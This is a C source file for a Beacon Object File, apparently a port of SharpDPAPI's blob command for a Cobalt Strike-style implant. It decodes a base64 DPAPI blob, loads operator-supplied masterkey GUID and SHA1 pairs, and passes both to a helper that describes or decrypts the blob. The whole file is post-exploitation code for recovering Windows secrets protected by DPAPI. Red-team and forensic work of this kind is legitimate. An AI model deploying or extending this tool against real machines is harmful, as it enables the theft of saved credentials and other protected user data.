/*
 * blob.c — BOF for describing/decrypting a raw DPAPI blob
 *
 * Usage:
 *   blob /target:BASE64_BLOB [/credkey:KEY] [/unprotect]
 *
 * Parses and optionally decrypts a DPAPI blob.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "dpapi_common.h"
#include "helpers.h"

void go(char* args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char* blob_b64   = BeaconDataExtract(&parser, NULL);
    char* credkey    = BeaconDataExtract(&parser, NULL);
    int   unprotect  = BeaconDataInt(&parser);

    if (!blob_b64 || strlen(blob_b64) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Usage: blob /target:BASE64_BLOB [/credkey:KEY] [/unprotect]\n");
        return;
    }

    /* Decode the blob */
    int blob_len = 0;
    BYTE* blob_data = base64_decode(blob_b64, &blob_len);
    if (!blob_data || blob_len == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to decode base64 blob\n");
        return;
    }

    MASTERKEY_CACHE cache;
    mk_cache_init(&cache);

    /* Load masterkeys from credkey */
    if (credkey && strlen(credkey) > 0) {
        char* ck = (char*)intAlloc(strlen(credkey) + 1);
        if (ck) {
            strcpy(ck, credkey);
            char* pair = strtok(ck, ",");
            while (pair) {
                char* colon = strchr(pair, ':');
                if (colon) {
                    *colon = 0;
                    GUID guid;
                    if (string_to_guid(pair, &guid)) {
                        int sha1_len = 0;
                        BYTE* sha1 = hex_to_bytes(colon + 1, &sha1_len);
                        if (sha1 && sha1_len == 20) mk_cache_add(&cache, &guid, sha1);
                        if (sha1) intFree(sha1);
                    }
                }
                pair = strtok(NULL, ",");
            }
            intFree(ck);
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== SharpDPAPI Blob Describe (BOF) ===\n");

    describe_dpapi_blob(blob_data, blob_len,
                        cache.count > 0 ? &cache : NULL,
                        (BOOL)unprotect,
                        NULL);

    mk_cache_free(&cache);
    intFree(blob_data);
}
